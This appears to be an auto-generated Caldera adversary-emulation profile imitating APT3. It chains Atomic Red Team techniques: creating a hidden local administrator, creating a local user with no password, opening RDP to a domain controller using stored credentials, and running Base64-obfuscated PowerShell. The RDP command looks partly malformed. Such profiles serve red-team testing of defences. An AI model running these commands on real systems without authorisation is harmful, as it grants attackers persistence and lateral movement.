adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_1__2023-10-19-22_30_11
name: Custom Adversary Profile
description: [['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__persistence', 'atomic__persistence'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- 48d31e40ff939a9ea616219271b1b7a8 # ('48d31e40ff939a9ea616219271b1b7a8', 'None', 'None') ; {'description': 'Creates a new admin user in a command prompt.\n', 'tactic': 'persistence', 'technique': {'attack_id': 'T1136.001', 'name': 'Create Account: Local Account'}, 'platforms': {'windows': {'cmd': {'cleanup': 'net user /del "T1136.001_Admin" >nul 2>&1', 'command': 'net user /add "#{username}" "#{password}" && net localgroup administrators "#{username}" /add', 'payloads': []}}}, 'id__dependence__fact': ['48d31e40ff939a9ea616219271b1b7a8', 'None', 'None'], 'plugin': 'atomic'}
- 2a3209689a6452c07f869f45414cbb4c # ('2a3209689a6452c07f869f45414cbb4c', 'None', 'validate_me') ; {'description': 'Attempt an RDP session via Remote Desktop Application to a DomainController.\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.001', 'name': 'Remote Services: Remote Desktop Protocol'}, 'platforms': {'windows': {'psh': {'cleanup': '$p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }', 'command': 'if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password="#{password}"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo "RDP connection established"', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['2a3209689a6452c07f869f45414cbb4c', 'None', 'validate_me'], 'plugin': 'atomic'}
- ae9ef01b8b55a7001139255811ba1d4f # ('ae9ef01b8b55a7001139255811ba1d4f', 'None', 'None') ; {'description': 'Use of obfuscated PowerShell to execute an arbitrary command; outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.\n', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==', 'payloads': []}}}, 'id__dependence__fact': ['ae9ef01b8b55a7001139255811ba1d4f', 'None', 'None'], 'plugin': 'atomic'}
- 1d3d2e634f1bc294f04ce84944b30de9 # ('1d3d2e634f1bc294f04ce84944b30de9', 'None', 'validate_me') ; {'description': 'Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run "net user" in powershell or CMD and observe that there is a new user named "T1136.001_PowerShell"\n', 'tactic': 'persistence', 'technique': {'attack_id': 'T1136.001', 'name': 'Create Account: Local Account'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-LocalUser -Name "T1136.001_PowerShell" -ErrorAction Ignore', 'command': 'New-LocalUser -Name "T1136.001_PowerShell" -NoPassword', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['1d3d2e634f1bc294f04ce84944b30de9', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []